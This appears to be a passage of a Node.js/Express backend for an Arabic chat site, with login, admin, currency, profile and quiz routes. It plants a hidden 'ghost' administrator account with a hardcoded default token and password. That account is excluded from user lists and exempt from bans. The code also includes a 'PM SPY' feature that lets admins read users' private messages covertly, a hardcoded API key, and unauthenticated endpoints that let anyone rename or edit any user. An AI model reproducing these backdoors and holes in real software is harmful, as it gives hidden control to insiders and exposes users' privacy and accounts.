    if (u.is_banned && !exemptRanks.includes(u.rank)) return res.json({ok:false,msg:'تم حظرك'});
    // رفع الحظر تلقائياً عن الأدمن إذا كان محظوراً بالخطأ
    if (u.is_banned && exemptRanks.includes(u.rank)) {
      await db.query('UPDATE users SET is_banned=FALSE WHERE username=$1',[username]);
    }
    res.json({ok:true,user:{username:u.username,rank:u.rank,points:u.points||0,age:u.age||22,gender:u.gender||'ذكر',nameColor:u.name_color||null,nameFontSize:u.name_font_size||null,nameFontFamily:u.name_font_family||null}});
  } else {
    const u=memUsers[username];
    if (!u||u.password!==hashed) return res.json({ok:false,msg:'اسم المستخدم أو كلمة المرور خاطئة'});
    const exemptRanks = ['owner','ghost','super_admin','owner_admin','owner_vip'];
    if (u.is_banned && !exemptRanks.includes(u.rank)) return res.json({ok:false,msg:'تم حظرك'});
    if (u.is_banned && exemptRanks.includes(u.rank)) u.is_banned = false;
    res.json({ok:true,user:{username:u.username,rank:u.rank,points:u.points||0,age:u.age||22,gender:u.gender||'ذكر',nameColor:u.name_color||null,nameFontSize:u.name_font_size||null,nameFontFamily:u.name_font_family||null}});
  }
});

// ===== ADMIN ROUTES =====

// One-time ghost account setup endpoint
// Debug: check ghost account exists
app.get('/api/check-ghost', async (req,res) => {
  const token = req.query.token || req.headers['x-admin-token'];
  if (token !== (process.env.ADMIN_TOKEN || 'ghazal-admin-2024')) return res.json({ok:false,msg:'غير مصرح'});
  const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';
  if (useDB) {
    const r = await db.query('SELECT username,rank,is_banned FROM users WHERE username=$1',[ghostName]);
    res.json({ok:true, useDB:true, found: r.rows.length>0, user: r.rows[0]||null});
  } else {
    const u = memUsers[ghostName];
    res.json({ok:true, useDB:false, found:!!u, rank:u?.rank});
  }
});

app.get('/api/setup-ghost', async (req,res) => {
  const token = req.query.token || req.headers['x-admin-token'];
  if (token !== (process.env.ADMIN_TOKEN || 'ghazal-admin-2024')) return res.json({ok:false,msg:'غير مصرح'});
  try {
    const ghostPass = hashPassword(process.env.GHOST_PASSWORD || 'gh0st@2024#secret');
    const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';
    if (useDB) {
      await db.query(
        `INSERT INTO users (username,password,rank) VALUES ($1,$2,'ghost')
         ON CONFLICT (username) DO UPDATE SET password=$2, rank='ghost'`,
        [ghostName, ghostPass]
      );
    } else {
      memUsers[ghostName] = { username: ghostName, password: ghostPass, rank: 'ghost', is_banned: false, points: 0 };
    }
    res.json({ ok: true, msg: 'Ghost account ready: ' + ghostName });
  } catch(e) {
    res.json({ ok: false, msg: e.message });
  }
});
app.get('/api/admin/users', adminAuth, async (req,res) => {
  if (useDB) {
    const r=await db.query("SELECT id,username,rank,is_banned,points,created_at FROM users WHERE rank!='ghost' ORDER BY created_at DESC");
    res.json({ok:true,users:r.rows});
  } else { res.json({ok:true,users:Object.values(memUsers).filter(u=>u.rank!=='ghost').map(u=>({...u,password:undefined}))}); }
});
app.post('/api/admin/ban', adminAuth, async (req,res) => {
  const {username,reason,adminName,adminRank}=req.body;
  const now=new Date();
  if (useDB) await db.query('UPDATE users SET is_banned=TRUE,ban_reason=$2,banned_by=$3,banned_at=NOW() WHERE username=$1',[username,reason||null,adminName||'أدمن']);
  else if (memUsers[username]){ memUsers[username].is_banned=true; memUsers[username].ban_reason=reason||''; memUsers[username].banned_by=adminName||'أدمن'; memUsers[username].banned_at=now.toISOString(); }
  const kickMsg = reason ? `تم حظرك من الموقع\nالسبب: ${reason}` : 'تم حظرك من الموقع';
  kickUser(username, kickMsg);
  logAction(adminName||'أدمن',adminRank||'admin','🚫 حظر',username,reason?'السبب: '+reason:'');
  // Add to banLog
  banLog.unshift({username,reason:reason||'',bannedBy:adminName||'أدمن',bannedByRank:adminRank||'admin',time:now.toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false}),ts:now.getTime(),active:true});
  if(banLog.length>200) banLog.pop();
  res.json({ok:true});
});
app.post('/api/admin/unban', adminAuth, async (req,res) => {
  const {username,adminName,adminRank}=req.body;
  if (useDB) await db.query('UPDATE users SET is_banned=FALSE,ban_reason=NULL,banned_by=NULL,banned_at=NULL WHERE username=$1',[username]);
  else if (memUsers[username]){ memUsers[username].is_banned=false; delete memUsers[username].ban_reason; delete memUsers[username].banned_by; }
  logAction(adminName||'أدمن',adminRank||'admin','✅ رفع الحظر',username);
  // Mark in banLog
  const entry=banLog.find(e=>e.username===username&&e.active);
  if(entry){ entry.active=false; entry.unbannedBy=adminName||'أدمن'; entry.unbannedTime=new Date().toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false}); }
  res.json({ok:true});
});

// Ban log API
app.get('/api/admin/ban-log', adminAuth, async (req,res) => {
  let dbBans=[];
  if (useDB) {
    try{
      const r=await db.query('SELECT username,ban_reason,banned_by,banned_at,is_banned FROM users WHERE (is_banned=TRUE OR ban_reason IS NOT NULL) ORDER BY banned_at DESC NULLS LAST LIMIT 100');
      dbBans=r.rows.map(u=>({username:u.username,reason:u.ban_reason||'',bannedBy:u.banned_by||'',time:u.banned_at?new Date(u.banned_at).toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false}):'',active:u.is_banned}));
    }catch(e){}
  }
  res.json({ok:true, log: useDB ? dbBans : banLog});
});
app.post('/api/admin/setrank', adminAuth, async (req,res) => {
  const {username,rank,adminName,adminRank}=req.body;
  if (!RANKS[rank]) return res.json({ok:false,msg:'رتبة غير صحيحة'});
  if (useDB) await db.query('UPDATE users SET rank=$1 WHERE username=$2',[rank,username]);
  else if (memUsers[username]) memUsers[username].rank=rank;
  const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) { chatUsers[sid].rank=rank; io.to(sid).emit('rank-changed',{rank,rankInfo:RANKS[rank]}); }
  io.emit('user-rank-updated',{username,rank,rankInfo:RANKS[rank]});
  logAction(adminName||'أدمن',adminRank||'admin','🏅 تغيير رتبة',username,'← '+rank);
  res.json({ok:true});
});
app.post('/api/changepass', async (req,res) => {
  const {username,oldpassword,newpassword}=req.body;
  if (!username||!oldpassword||!newpassword) return res.json({ok:false,msg:'بيانات ناقصة'});
  if (newpassword.length<4) return res.json({ok:false,msg:'كلمة المرور الجديدة قصيرة'});
  const oldHashed=hashPassword(oldpassword); const newHashed=hashPassword(newpassword);
  if (useDB) {
    const check=await db.query('SELECT id FROM users WHERE username=$1 AND password=$2',[username,oldHashed]);
    if (!check.rows.length) return res.json({ok:false,msg:'كلمة المرور القديمة خاطئة'});
    await db.query('UPDATE users SET password=$1 WHERE username=$2',[newHashed,username]);
  } else {
    const u=memUsers[username];
    if (!u||u.password!==oldHashed) return res.json({ok:false,msg:'كلمة المرور القديمة خاطئة'});
    u.password=newHashed;
  }
  res.json({ok:true});
});
app.post('/api/admin/resetpass', adminAuth, async (req,res) => {
  const {username,newpassword,adminName,adminRank}=req.body;
  if (!username||!newpassword||newpassword.length<4) return res.json({ok:false,msg:'كلمة المرور قصيرة'});
  const hashed=hashPassword(newpassword);
  if (useDB) { const r=await db.query('UPDATE users SET password=$1 WHERE username=$2',[hashed,username]); if (r.rowCount===0) return res.json({ok:false,msg:'المستخدم غير موجود'}); }
  else { if (!memUsers[username]) return res.json({ok:false,msg:'المستخدم غير موجود'}); memUsers[username].password=hashed; }
  logAction(adminName||'أدمن',adminRank||'admin','🔑 إعادة تعيين كلمة المرور',username);
  res.json({ok:true});
});
app.post('/api/admin/clearroom', adminAuth, async (req,res) => {
  const {room,adminName,adminRank}=req.body;
  if (useDB) await db.query('DELETE FROM messages WHERE room=$1',[room]);
  memMessages[room]=[]; io.to(room).emit('room-cleared',room);
  logAction(adminName||'أدمن',adminRank||'admin','🗑️ مسح رسائل الغرفة',ROOMS[room]?.name||room);
  res.json({ok:true});
});
app.get('/api/messages/:room', async (req,res) => {
  const room=req.params.room;
  if (!ROOMS[room]) return res.json({ok:false});
  if (useDB) { const r=await db.query('SELECT * FROM messages WHERE room=$1 ORDER BY created_at DESC LIMIT 50',[room]); res.json({ok:true,messages:r.rows.reverse()}); }
  else { res.json({ok:true,messages:memMessages[room]||[]}); }
});
app.get('/api/leaderboard', async (req,res) => {
  if (useDB) { const r=await db.query("SELECT username,rank,points FROM users WHERE rank!='ghost' ORDER BY points DESC LIMIT 20"); res.json({ok:true,users:r.rows}); }
  else { const users=Object.values(memUsers).filter(u=>u.rank!=='ghost').map(u=>({username:u.username,rank:u.rank,points:u.points||0})).sort((a,b)=>b.points-a.points).slice(0,20); res.json({ok:true,users}); }
});

// ===== ADMIN POINTS MANAGEMENT =====
app.post('/api/admin/points/set', adminAuth, async (req,res) => {
  const {username, points, adminName, adminRank} = req.body;
  if (!username) return res.json({ok:false,msg:'اسم المستخدم مطلوب'});
  const pts = parseInt(points) || 0;
  if (useDB) {
    await db.query('UPDATE users SET points=points+$1 WHERE username=$2',[pts,username]);
    const r = await db.query('SELECT points FROM users WHERE username=$1',[username]);
    const newPts = r.rows[0]?.points || 0;
    const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
    if (sid) { chatUsers[sid].points = newPts; io.to(sid).emit('points-updated',{points:newPts}); }
    logAction(adminName||'أدمن', adminRank||'admin', '⭐ تعديل النقاط', username, `${pts>0?'+':''}${pts}`);
    res.json({ok:true, points:newPts});
  } else {
    if (!memUsers[username]) return res.json({ok:false,msg:'المستخدم غير موجود'});
    memUsers[username].points = (memUsers[username].points||0) + pts;
    const newPts = memUsers[username].points;
    const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
    if (sid) { chatUsers[sid].points = newPts; io.to(sid).emit('points-updated',{points:newPts}); }
    logAction(adminName||'أدمن', adminRank||'admin', '⭐ تعديل النقاط', username, `${pts>0?'+':''}${pts}`);
    res.json({ok:true, points:newPts});
  }
});
// ===== END ADMIN POINTS =====
async function getGold(username) {
  // استخدم الذاكرة أولاً - أسرع بكثير
  if (memGold[username]) return memGold[username];
  if (useDB) {
    try {
      const r = await db.query('SELECT gold,diamond FROM user_gold WHERE username=$1',[username]);
      const data = r.rows[0] || {gold:0,diamond:0};
      memGold[username] = data; // خزّن في الذاكرة
      return data;
    } catch(e) { return {gold:0,diamond:0}; }
  }
  return {gold:0,diamond:0};
}
async function setGold(username, gold, diamond) {
  // حفظ في الذاكرة فوراً - لا انتظار
  memGold[username] = {gold, diamond};
  if (useDB) _goldDirty.add(username); // سيُحفظ في DB لاحقاً
}

// Get gold/diamond for a user
app.get('/api/gold/:username', async (req,res) => {
  const data = await getGold(req.params.username);
  res.json({ok:true, ...data});
});

// Admin: add/set gold and diamond for a user
app.post('/api/admin/gold/set', adminAuth, async (req,res) => {
  const {username, gold, diamond, adminName, adminRank} = req.body;
  if (!username) return res.json({ok:false,msg:'اسم المستخدم مطلوب'});
  const cur = await getGold(username);
  const newGold = Math.max(0, (cur.gold||0) + (parseInt(gold)||0));
  const newDiamond = Math.max(0, (cur.diamond||0) + (parseInt(diamond)||0));
  await setGold(username, newGold, newDiamond);
  // Notify user live
  const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) {
    chatUsers[sid].gold = newGold;
    chatUsers[sid].diamond = newDiamond;
    io.to(sid).emit('gold-updated', {gold:newGold, diamond:newDiamond});
  }
  logAction(adminName||'أدمن', adminRank||'admin', '💰 تعديل الذهب/الماس', username, `ذهب:+${gold||0} ماس:+${diamond||0}`);
  res.json({ok:true, gold:newGold, diamond:newDiamond});
});

// Admin: reset gold/diamond for a user
app.post('/api/admin/gold/reset', adminAuth, async (req,res) => {
  const {username, adminName, adminRank} = req.body;
  if (!username) return res.json({ok:false,msg:'اسم المستخدم مطلوب'});
  await setGold(username, 0, 0);
  const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) { chatUsers[sid].gold=0; chatUsers[sid].diamond=0; io.to(sid).emit('gold-updated',{gold:0,diamond:0}); }
  logAction(adminName||'أدمن', adminRank||'admin', '🔄 إعادة تعيين الذهب/الماس', username);
  res.json({ok:true});
});

// Config: call cost (gold required to make a call)
let callCostConfig = { voice: 10, video: 20 }; // default costs
app.get('/api/admin/call-cost', adminAuth, (req,res) => res.json({ok:true, config:callCostConfig}));
app.post('/api/admin/call-cost', adminAuth, (req,res) => {
  const {voice,video} = req.body;
  if (voice !== undefined) callCostConfig.voice = Math.max(0, parseInt(voice)||0);
  if (video !== undefined) callCostConfig.video = Math.max(0, parseInt(video)||0);
  io.emit('call-cost-updated', callCostConfig);
  res.json({ok:true, config:callCostConfig});
});
// ===== HEALTH CHECK =====
app.get('/api/health', (req,res) => res.json({ok:true, uptime: process.uptime(), ts: Date.now()}));

app.get('/api/call-cost', (req,res) => res.json({ok:true, config:callCostConfig}));

// ===== TURN Credentials Endpoint =====
// يجلب credentials حقيقية من Metered API لكل مكالمة
const METERED_API_KEY = '39d2dc58074da5473b5110e6e2a6f4578b6f';
const METERED_DOMAIN  = 'apikey.metered.live';

app.get('/api/turn-credentials', async (req, res) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
  try {
    const https = require('https');
    const url = `https://${METERED_DOMAIN}/api/v1/turn/credentials?apiKey=${METERED_API_KEY}`;
    const data = await new Promise((resolve, reject) => {
      https.get(url, (r) => {
        let body = '';
        r.on('data', c => body += c);
        r.on('end', () => {
          try { resolve(JSON.parse(body)); } catch(e) { reject(e); }
        });
      }).on('error', reject);
    });
    // data هو مصفوفة من ICE servers من Metered
    res.json({ ok: true, iceServers: data });
  } catch(e) {
    console.error('TURN fetch error:', e.message);
    // fallback إذا فشل الجلب
    res.json({
      ok: true,
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' }
      ]
    });
  }
});
// ===== END GOLD & DIAMOND API =====

// ===== ADMIN QUIZ QUESTIONS MANAGEMENT =====
let adminQuizQuestions = []; // custom questions added by admin at runtime

app.get('/api/admin/quiz-questions', adminAuth, (req,res) => {
  res.json({ ok:true, questions: adminQuizQuestions });
});

app.post('/api/admin/quiz-questions/add', adminAuth, (req,res) => {
  const { q, a, hint, points } = req.body;
  if (!q || !a) return res.json({ ok:false, msg:'السؤال والإجابة مطلوبان' });
  const newQ = { q: q.trim(), a: a.trim(), hint: hint||'', points: parseInt(points)||50 };
  adminQuizQuestions.push(newQ);
  // Inject into active quiz pools immediately
  Object.keys(quizState).forEach(roomId => {
    if (quizState[roomId]) quizState[roomId].pool.push({...newQ});
  });
  res.json({ ok:true, questions: adminQuizQuestions });
});

app.post('/api/admin/quiz-questions/remove', adminAuth, (req,res) => {
  const { idx } = req.body;
  if (idx === undefined || idx < 0 || idx >= adminQuizQuestions.length)
    return res.json({ ok:false, msg:'السؤال غير موجود' });
  adminQuizQuestions.splice(idx, 1);
  res.json({ ok:true, questions: adminQuizQuestions });
});

// ===== PROFILE API =====
// Get profile
app.get('/api/profile/:username', async (req,res) => {
  const { username } = req.params;
  let user, profile;
  if (useDB) {
    const ur = await db.query('SELECT username,rank,points,age,gender,created_at FROM users WHERE username=$1',[username]);
    if (!ur.rows.length) {
      const liveUser = Object.values(chatUsers).find(u=>u.name===username);
      if (!liveUser) return res.json({ok:false,msg:'المستخدم غير موجود'});
      user = { username: liveUser.name, rank: liveUser.rank, points: liveUser.points||0, age: liveUser.age||null, gender: liveUser.gender||null };
    } else {
      user = ur.rows[0];
    }
    const pr = await db.query('SELECT * FROM profiles WHERE username=$1',[username]);
    profile = pr.rows[0] || {};
  } else {
    user = memUsers[username];
    if (!user) {
      const liveUser = Object.values(chatUsers).find(u=>u.name===username);
      if (!liveUser) return res.json({ok:false,msg:'المستخدم غير موجود'});
      user = { username: liveUser.name, rank: liveUser.rank, points: liveUser.points||0, age: liveUser.age||null, gender: liveUser.gender||null };
    }
    profile = memProfiles[username] || {};
  }
  let userBadgesList = [];
  if (useDB) {
    try {
      const br = await db.query('SELECT b.* FROM badges b JOIN user_badges ub ON b.id=ub.badge_id WHERE ub.username=$1 ORDER BY ub.assigned_at',[username]);
      userBadgesList = br.rows;
    } catch(e){}
  } else {
    const ids = memUserBadges[username]||[];
    userBadgesList = memBadges.filter(b=>ids.includes(b.id));
  }
  // Also check live user for age/gender if not in DB record
  const liveUser = Object.values(chatUsers).find(u=>u.name===username);
  const age = user.age || liveUser?.age || null;
  const gender = user.gender || liveUser?.gender || null;
  res.json({ok:true, profile:{
    username: user.username,
    rank: user.rank,
    points: user.points||0,
    age: age,
    gender: gender,
    created_at: user.created_at || null,
    avatar: profile.avatar||null,
    cover: profile.cover||null,
    music_url: profile.music_url||null,
    music_name: profile.music_name||null,
    bio: profile.bio||null,
    badges: userBadgesList,
    avatar_shape: profile.avatar_shape || 'circle',
  }});
});

// Update profile (avatar as base64, music as youtube/soundcloud URL)
app.post('/api/profile/update', async (req,res) => {
  const { username, avatar, cover, music_url, music_name, bio, age, gender, avatar_shape } = req.body;
  if (!username) return res.json({ok:false,msg:'مطلوب اسم المستخدم'});
  if (avatar && avatar.length > 5 * 1024 * 1024) return res.json({ok:false,msg:'الصورة الشخصية كبيرة جداً، حاول مرة أخرى'});
  if (cover && cover.length > 5 * 1024 * 1024) return res.json({ok:false,msg:'صورة الغلاف كبيرة جداً، حاول مرة أخرى'});
  const validShape = ['circle','square'].includes(avatar_shape) ? avatar_shape : null;
  if (useDB) {
    await db.query('ALTER TABLE profiles ADD COLUMN IF NOT EXISTS cover TEXT DEFAULT NULL').catch(()=>{});
    await db.query('ALTER TABLE profiles ADD COLUMN IF NOT EXISTS avatar_shape VARCHAR(10) DEFAULT \'circle\'').catch(()=>{});
    if (age || gender) {
      await db.query('UPDATE users SET age=COALESCE($1,age), gender=COALESCE($2,gender) WHERE username=$3',
        [age?parseInt(age):null, gender||null, username]).catch(()=>{});
    }
    await db.query(`INSERT INTO profiles (username,avatar,cover,music_url,music_name,bio,avatar_shape,updated_at)
      VALUES ($1,$2,$3,$4,$5,$6,$7,NOW())
      ON CONFLICT (username) DO UPDATE SET
        avatar=COALESCE($2,profiles.avatar),
        cover=COALESCE($3,profiles.cover),
        music_url=COALESCE($4,profiles.music_url),
        music_name=COALESCE($5,profiles.music_name),
        bio=COALESCE($6,profiles.bio),
        avatar_shape=COALESCE($7,profiles.avatar_shape),
        updated_at=NOW()`,
      [username, avatar||null, cover||null, music_url||null, music_name||null, bio||null, validShape||null]);
  } else {
    memProfiles[username] = memProfiles[username] || {};
    if (avatar) memProfiles[username].avatar = avatar;
    if (cover) memProfiles[username].cover = cover;
    if (music_url) memProfiles[username].music_url = music_url;
    if (music_name) memProfiles[username].music_name = music_name;
    if (bio !== undefined) memProfiles[username].bio = bio;
    if (validShape) memProfiles[username].avatar_shape = validShape;
  }
  const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) {
    if (avatar) chatUsers[sid].avatar = avatar;
    if (validShape) chatUsers[sid].avatar_shape = validShape;
    const room = chatUsers[sid].room;
    if (room) io.to(room).emit('room-users', getRoomUsers(room));
  }
  res.json({ok:true});
});

// ===== CHANGE USERNAME =====
app.post('/api/change-username', async (req,res) => {
  const { oldName, newName } = req.body;
  if (!oldName || !newName) return res.json({ok:false,msg:'بيانات ناقصة'});
  const nm = newName.trim();
  if (nm.length < 2 || nm.length > 20) return res.json({ok:false,msg:'الاسم بين 2 و 20 حرف'});
  if (!/^[a-zA-Z0-9\u0600-\u06FF_\-. ]+$/.test(nm)) return res.json({ok:false,msg:'اسم يحتوي على رموز غير مسموحة'});
  try {
    if (useDB) {
      const ex = await db.query('SELECT username FROM users WHERE username=$1',[nm]);
      if (ex.rows.length > 0) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
      await db.query('UPDATE users SET username=$1 WHERE username=$2',[nm,oldName]);
      await db.query('UPDATE messages SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
      await db.query('UPDATE profiles SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
    } else {
      if (memUsers[nm]) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
      if (memUsers[oldName]) { memUsers[nm]=memUsers[oldName]; delete memUsers[oldName]; }
      if (memProfiles[oldName]) { memProfiles[nm]=memProfiles[oldName]; delete memProfiles[oldName]; }
    }
    const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===oldName);
    if (sid) {
      chatUsers[sid].name = nm;
      const room = chatUsers[sid].room;
      io.to(room).emit('room-users', getRoomUsers(room));
    }
    res.json({ok:true});
  } catch(e) { console.error(e); res.json({ok:false,msg:'خطأ في قاعدة البيانات'}); }
});

app.post('/api/admin/rename-user', adminAuth, async (req,res) => {
  const { oldName, newName } = req.body;
  if (!oldName || !newName) return res.json({ok:false,msg:'بيانات ناقصة'});
  const nm = newName.trim();
  if (nm.length < 2 || nm.length > 20) return res.json({ok:false,msg:'الاسم بين 2 و 20 حرف'});
  try {
    if (useDB) {
      const ex = await db.query('SELECT username FROM users WHERE username=$1',[nm]);
      if (ex.rows.length > 0) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
      await db.query('UPDATE users SET username=$1 WHERE username=$2',[nm,oldName]);
      await db.query('UPDATE messages SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
      await db.query('UPDATE profiles SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
    } else {
      if (memUsers[nm]) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
      if (memUsers[oldName]) { memUsers[nm]=memUsers[oldName]; delete memUsers[oldName]; }
    }
    const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===oldName);
    if (sid) {
      chatUsers[sid].name = nm;
      io.to(sid).emit('username-changed',{newName:nm,msg:'تم تغيير اسمك من قبل الإدارة'});
    }
    res.json({ok:true});
  } catch(e) { console.error(e); res.json({ok:false,msg:'خطأ في قاعدة البيانات'}); }
});
// ===== END CHANGE USERNAME =====

// ===== PM SPY SYSTEM (Admin Only) =====
// Get list of all conversations (admin only)
app.get('/api/admin/pm-conversations', adminAuth, async (req,res) => {
  let convs = [];
  if (useDB) {
    try {
      const r = await db.query(`
        SELECT conv_key, 
               array_agg(DISTINCT from_user) as users_arr,
               COUNT(*) as count,
               MAX(text) as last_msg,
               MAX(time) as last_time,
               MAX(created_at) as last_at
        FROM private_messages
        GROUP BY conv_key
        ORDER BY MAX(created_at) DESC
        LIMIT 100
      `);
      convs = r.rows.map(row => {
        const parts = row.conv_key.split('||');
        return {
          key: row.conv_key,
          users: parts,
          count: parseInt(row.count),
          lastMsg: (row.last_msg||'').substring(0,40),
          lastTime: row.last_time||'',
          hasActiveCall: !!activeCalls[row.conv_key],
          callType: activeCalls[row.conv_key]?.type || null
        };
      });
    } catch(e) { console.log('pm-conv DB error:', e.message); }
  } else {
    convs = Object.keys(memPMs).map(key => {
      const parts = key.split('||');
      const msgs = memPMs[key];
      const last = msgs[msgs.length-1];
      return { key, users: parts, count: msgs.length, lastMsg: last?.text?.substring(0,40)||'', lastTime: last?.time||'', hasActiveCall: !!activeCalls[key], callType: activeCalls[key]?.type||null };
    });
  }
  // Add active calls not in DB yet
  Object.keys(activeCalls).forEach(key => {
    if (!convs.find(c=>c.key===key)) {
      const c = activeCalls[key];
      convs.push({ key, users:[c.user1,c.user2], count:0, lastMsg:'', lastTime:'', hasActiveCall:true, callType:c.type });
    }
  });
  const onlineUsers = Object.values(chatUsers).map(u=>({name:u.name,rank:u.rank}));
  res.json({ok:true, conversations: convs, onlineUsers});
});

// Get full PM history between two users (admin only)
app.get('/api/admin/pm-history', adminAuth, async (req,res) => {
  const {user1, user2} = req.query;
  if (!user1 || !user2) return res.json({ok:false,msg:'مطلوب اسمي المستخدمين'});
  const key = [user1, user2].sort().join('||');
  if (useDB) {
    try {
      const r = await db.query(
        `SELECT from_user as "from", to_user as "to", text, time, COALESCE(msg_type,'private') as type, media_data as "imageData" FROM private_messages WHERE conv_key=$1 ORDER BY created_at ASC LIMIT 200`,
        [key]
      );
      res.json({ok:true, messages: r.rows, key});
    } catch(e) { res.json({ok:false,msg:e.message}); }
  } else {
    const msgs = memPMs[key] || [];
    res.json({ok:true, messages: msgs, key});
  }
});
// ===== END PM SPY SYSTEM =====
app.get('/api/admin/permissions', adminAuth, async (req,res) => {
  try {
    const perms = await getPerms();
    res.json({ok:true, perms});
  } catch(e) { res.json({ok:false,msg:e.message}); }
});

app.post('/api/admin/permissions', adminAuth, async (req,res) => {
  const { rank, perms } = req.body;
  const RANKS = ['owner','owner_admin','owner_vip','super_admin','admin'];
  if (!RANKS.includes(rank)) return res.json({ok:false,msg:'رتبة غير صحيحة'});
  // owner cannot be restricted
  if (rank === 'owner') return res.json({ok:false,msg:'لا يمكن تغيير صلاحيات المالك'});
  if (useDB) {
    await db.query(`INSERT INTO permissions (rank,perms) VALUES ($1,$2) ON CONFLICT (rank) DO UPDATE SET perms=$2`, [rank, perms]);
  } else {
    memPerms[rank] = perms;
  }
  // broadcast updated perms to all connected clients
  const allPerms = await getPerms();
  io.emit('permissions-updated', allPerms);
  res.json({ok:true});
});

app.get('/api/permissions', async (req,res) => {
  try {
    const perms = await getPerms();
    res.json({ok:true, perms});
  } catch(e) { res.json({ok:false}); }
});
const QUIZ_QUESTIONS = [
  // جغرافيا
  {q:'ما اسم الحيوان الذي يستخرج منه المسك ذو الرائحة العطرة؟',a:'الغزال',hint:'الغ_ال',points:50},
  {q:'ما هو أعلى جبل في أفريقيا؟',a:'كيليمانجارو',hint:'ك_ل_م_ن_ارو',points:100},
  {q:'ما عاصمة المملكة العربية السعودية؟',a:'الرياض',hint:'الر_اض',points:30},
  {q:'ما أكبر دولة في العالم مساحةً؟',a:'روسيا',hint:'رو_يا',points:40},
  {q:'ما أطول نهر في العالم؟',a:'النيل',hint:'الن_ل',points:40},
  {q:'في أي دولة تقع برج إيفل؟',a:'فرنسا',hint:'فر_سا',points:30},
  {q:'ما عاصمة اليابان؟',a:'طوكيو',hint:'طو_يو',points:30},
  {q:'ما هو المحيط الأكبر في العالم؟',a:'الهادئ',hint:'الها_ئ',points:50},
  {q:'ما هو أسرع حيوان على اليابسة؟',a:'الفهد',hint:'الف_د',points:40},
  {q:'ما هي عاصمة العراق؟',a:'بغداد',hint:'ب_داد',points:20},
  {q:'كم عدد محافظات العراق؟',a:'18',hint:'1_',points:30},
  {q:'ما اسم أطول نهر في العراق؟',a:'دجلة',hint:'د_لة',points:30},
  {q:'ما عاصمة مصر؟',a:'القاهرة',hint:'الق_هرة',points:20},
  {q:'ما عاصمة تركيا؟',a:'أنقرة',hint:'أن_رة',points:30},
  {q:'ما أكبر مدينة في العالم من حيث عدد السكان؟',a:'طوكيو',hint:'طو_يو',points:50},
  {q:'ما عاصمة الصين؟',a:'بكين',hint:'ب_ين',points:25},
  {q:'ما عاصمة فرنسا؟',a:'باريس',hint:'با_يس',points:20},
  {q:'ما عاصمة ألمانيا؟',a:'برلين',hint:'بر_ين',points:25},
  {q:'ما عاصمة البرازيل؟',a:'برازيليا',hint:'برا_يليا',points:60},
  {q:'ما أطول جبل في العالم؟',a:'إيفرست',hint:'إي_رست',points:40},
  {q:'في أي قارة تقع مصر؟',a:'أفريقيا',hint:'أف_يقيا',points:30},
  {q:'ما أكبر صحراء في العالم؟',a:'الصحراء الكبرى',hint:'الص_راء الك_رى',points:60},
  {q:'ما أعمق بحيرة في العالم؟',a:'بايكال',hint:'با_كال',points:70},
  // علوم
  {q:'كم عدد أيام السنة؟',a:'365',hint:'3_5',points:20},
  {q:'ما هو الكوكب الأقرب للشمس؟',a:'عطارد',hint:'ع_ارد',points:50},
  {q:'ما العنصر الكيميائي الذي رمزه O؟',a:'الأكسجين',hint:'الأك_جين',points:60},
  {q:'كم عدد أسنان الإنسان البالغ؟',a:'32',hint:'_2',points:30},
  {q:'ما هو أصغر كوكب في المجموعة الشمسية؟',a:'عطارد',hint:'ع_ارد',points:50},
  {q:'ما هو أكبر كوكب في المجموعة الشمسية؟',a:'المشتري',hint:'الم_ري',points:40},
  {q:'كم عدد كواكب المجموعة الشمسية؟',a:'8',hint:'_',points:30},
  {q:'ما الغاز الأكثر وفرة في الغلاف الجوي؟',a:'النيتروجين',hint:'الن_روجين',points:60},
  {q:'ما وحدة قياس الكهرباء؟',a:'أمبير',hint:'أم_ير',points:40},
  {q:'كم تبعد الأرض عن الشمس بالكيلومتر تقريباً؟',a:'150 مليون',hint:'1_0 مليون',points:80},
  {q:'ما رمز الذهب في الجدول الدوري؟',a:'Au',hint:'A_',points:70},
  {q:'ما رمز الحديد في الجدول الدوري؟',a:'Fe',hint:'F_',points:60},
  {q:'ما تركيبة الماء الكيميائية؟',a:'H2O',hint:'H_O',points:20},
  {q:'كم تبلغ سرعة الضوء تقريباً؟',a:'300000 كم/ث',hint:'3_0000 كم',points:70},
  // تاريخ
  {q:'في أي عام فتحت القسطنطينية؟',a:'1453',hint:'1_53',points:80},
  {q:'من هو أول رئيس للولايات المتحدة الأمريكية؟',a:'جورج واشنطن',hint:'ج_رج وا_طن',points:50},
  {q:'في أي عام اندلعت الحرب العالمية الأولى؟',a:'1914',hint:'19_4',points:50},
  {q:'في أي عام انتهت الحرب العالمية الثانية؟',a:'1945',hint:'19_5',points:40},
  {q:'من بنى الأهرامات؟',a:'الفراعنة',hint:'الف_اعنة',points:30},
  {q:'ما اسم الإمبراطور الذي فتح القسطنطينية؟',a:'محمد الفاتح',hint:'م_مد الفا_ح',points:60},
  {q:'في أي عام ولد النبي محمد صلى الله عليه وسلم؟',a:'571',hint:'5_1',points:50},
  {q:'من اخترع الطباعة؟',a:'جوتنبرج',hint:'جو_نبرج',points:70},
  {q:'من اخترع التلفون؟',a:'غراهام بيل',hint:'غ_اهام ب_ل',points:50},
